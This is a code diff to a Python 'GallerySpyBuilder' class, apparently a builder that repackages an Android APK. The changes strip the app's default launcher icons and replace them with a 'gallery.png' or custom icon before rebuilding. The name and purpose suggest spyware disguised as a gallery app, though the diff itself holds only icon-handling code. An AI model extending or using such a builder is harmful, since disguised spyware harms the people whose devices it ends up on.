@@ -147,24 +147,24 @@ class GallerySpyBuilder:
             PIL_AVAILABLE = False
         
         if PIL_AVAILABLE:
-            icon_prompt = f"{Colors.YELLOW}[?] Icon path (press Enter to skip): {Colors.END}"
+            icon_prompt = f"{Colors.YELLOW}[?] Custom Icon path (press Enter to use gallery.png): {Colors.END}"
             icon_path = input(icon_prompt).strip()
             
             if icon_path:
                 icon_file = Path(icon_path)
                 if icon_file.exists():
                     self.config['icon'] = icon_file
-                    print(f"{Colors.GREEN}[✓] Icon will be changed: {icon_file.name}{Colors.END}")
+                    print(f"{Colors.GREEN}[✓] Custom icon will be used: {icon_file.name}{Colors.END}")
                 else:
                     self.config['icon'] = None
-                    print(f"{Colors.YELLOW}[!] Icon not found, using default{Colors.END}")
+                    print(f"{Colors.YELLOW}[!] Icon not found, using gallery.png{Colors.END}")
             else:
                 self.config['icon'] = None
-                print(f"{Colors.YELLOW}[!] Using default icon{Colors.END}")
+                print(f"{Colors.GREEN}[✓] Using default gallery.png icon{Colors.END}")
         else:
             self.config['icon'] = None
-            print(f"{Colors.YELLOW}[!] Pillow not installed, icon change disabled{Colors.END}")
-            print(f"{Colors.YELLOW}[!] Install: pip install Pillow{Colors.END}")
+            print(f"{Colors.YELLOW}[!] Pillow not installed, using gallery.png{Colors.END}")
+            print(f"{Colors.YELLOW}[!] Install Pillow for custom icons: pip install Pillow{Colors.END}")
         
         print(f"\n{Colors.GREEN}[✓] Configuration complete{Colors.END}\n")
         
@@ -345,7 +345,7 @@ class GallerySpyBuilder:
             return True
     
     def clean_icon_conflicts(self):
-        """Remove all .webp icon files to avoid conflicts"""
+        """Remove all default icon files (webp and png) to prepare for custom icon"""
         try:
             densities = ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']
             
@@ -355,6 +355,10 @@ class GallerySpyBuilder:
                     # Remove all .webp files
                     for webp_file in mipmap_dir.glob("*.webp"):
                         webp_file.unlink()
+                    
+                    # Remove all default .png icon files
+                    for png_file in mipmap_dir.glob("ic_launcher*.png"):
+                        png_file.unlink()
             
             # Also remove adaptive icon XML to avoid conflicts
             anydpi_dir = self.work_dir / "res/mipmap-anydpi-v26"
@@ -366,6 +370,49 @@ class GallerySpyBuilder:
             
         except Exception as e:
             print(f"\r{Colors.YELLOW}[!] Warning: Failed to clean icon conflicts: {e}{Colors.END}")
+            return True
+    
+    def apply_default_icon(self):
+        """Apply gallery.png as default icon"""
+        try:
+            from PIL import Image
+            
+            # Use gallery.png from base directory
+            default_icon = self.base_dir / "gallery.png"
+            
+            if not default_icon.exists():
+                print(f"\r{Colors.YELLOW}[!] Warning: gallery.png not found, skipping icon{Colors.END}")
+                return True
+            
+            icon_sizes = {
+                'mdpi': 48,
+                'hdpi': 72,
+                'xhdpi': 96,
+                'xxhdpi': 144,
+                'xxxhdpi': 192
+            }
+            
+            original_icon = Image.open(default_icon)
+            
+            if original_icon.mode != 'RGBA':
+                original_icon = original_icon.convert('RGBA')
+            
+            for density, size in icon_sizes.items():
+                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
+                
+                if mipmap_dir.exists():
+                    resized_icon = original_icon.resize((size, size), Image.Resampling.LANCZOS)
+                    
+                    icon_file = mipmap_dir / "ic_launcher.png"
+                    resized_icon.save(icon_file, 'PNG')
+                    
+                    round_icon_file = mipmap_dir / "ic_launcher_round.png"
+                    resized_icon.save(round_icon_file, 'PNG')
+            
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Warning: Failed to apply default icon: {e}{Colors.END}")
             return True
     
     def change_icon(self):
@@ -619,17 +666,23 @@ class GallerySpyBuilder:
             
             print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
             
-            # Always clean icon conflicts (webp files)
-            print(f"{Colors.CYAN}[*] Cleaning icon conflicts...{Colors.END}", end='', flush=True)
+            # Always clean icon conflicts (webp and default png files)
+            print(f"{Colors.CYAN}[*] Cleaning default icons...{Colors.END}", end='', flush=True)
             if not self.clean_icon_conflicts():
                 return
-            print(f"\r{Colors.GREEN}[✓] Icon conflicts cleaned{Colors.END}" + " " * 30)
+            print(f"\r{Colors.GREEN}[✓] Default icons removed{Colors.END}" + " " * 30)
             
+            # Apply custom icon or default gallery.png
             if self.config.get('icon'):
-                print(f"{Colors.CYAN}[*] Changing icon...{Colors.END}", end='', flush=True)
+                print(f"{Colors.CYAN}[*] Applying custom icon...{Colors.END}", end='', flush=True)
                 if not self.change_icon():
                     return
-                print(f"\r{Colors.GREEN}[✓] Icon changed{Colors.END}" + " " * 30)
+                print(f"\r{Colors.GREEN}[✓] Custom icon applied{Colors.END}" + " " * 30)
+            else:
+                print(f"{Colors.CYAN}[*] Applying gallery icon...{Colors.END}", end='', flush=True)
+                if not self.apply_default_icon():
+                    return
+                print(f"\r{Colors.GREEN}[✓] Gallery icon applied{Colors.END}" + " " * 30)
             
             unsigned_apk = self.rebuild_apk()
             if not unsigned_apk:
